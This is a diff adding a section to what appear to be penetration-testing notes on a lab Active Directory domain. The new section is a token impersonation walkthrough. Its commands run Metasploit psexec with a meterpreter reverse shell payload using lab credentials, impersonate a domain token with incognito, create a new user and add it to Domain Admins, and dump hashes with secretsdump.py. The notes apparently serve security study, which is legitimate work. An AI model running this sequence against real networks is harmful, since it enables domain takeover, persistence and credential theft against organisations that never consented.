@@ -138,3 +138,40 @@ If we impersonate a domain admin token, we can manage to execute succesffullu Mi
 It can be used to dump hashes as we impersonate admin domain account.
 
 It can also be used to create a new domain user using net user /add for example
+
+## Token Impersonation Walkthrough
+
+Can also use Mimikatz, msfconsole
+
+msfconsole
+search psexec
+use exploit/windows/smb/psexec
+options
+set payload windows/x64/meterpreter/reverse_tcp
+set RHOSTS 192.168.138.137
+set smbuser fcastle
+set smbpass Password1
+set smbdomain MARVEL.local
+options
+run
+
+shell
+whoami
+^C
+
+load incognito (while having admin domain account logged in)
+list_tokens -u
+impersonate_token marvel\\fcastle
+shell
+whoami
+^C
+rev2self (reset to normal)
+getuid
+
+Backbefore leaving with ^C we can add an user in the domain
+net user /add kawkeye Password1@ /domain
+net group "Domain Admins" hawkeye /ADD /DOMAIN // user is added to domain group 
+
+Can check user is properly added using :
+secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136
+
